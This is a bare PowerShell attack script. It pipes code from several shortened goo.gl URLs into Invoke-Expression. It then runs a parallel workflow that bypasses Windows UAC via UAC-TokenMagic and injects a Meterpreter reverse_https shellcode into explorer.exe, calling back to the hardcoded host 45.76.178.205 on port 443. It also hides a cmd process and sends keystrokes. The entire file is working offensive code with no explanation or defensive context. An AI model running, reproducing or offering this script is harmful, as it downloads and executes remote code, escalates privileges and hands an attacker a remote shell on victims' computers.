#iwr https://goo.gl/x6ZcHM | iex;
iwr https://goo.gl/JwTLrZ | iex;
iwr https://goo.gl/wxJHHq | iex;
iwr https://goo.gl/4QsWoj | iex;

workflow Test
{
    Parallel
    {
        sleep 1; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
        Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;
        sleep 1; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
        sleep 3; hide-process cmd; sleep 0.7; send-keys -Name $cmd -Cmd $cmd
    }
}
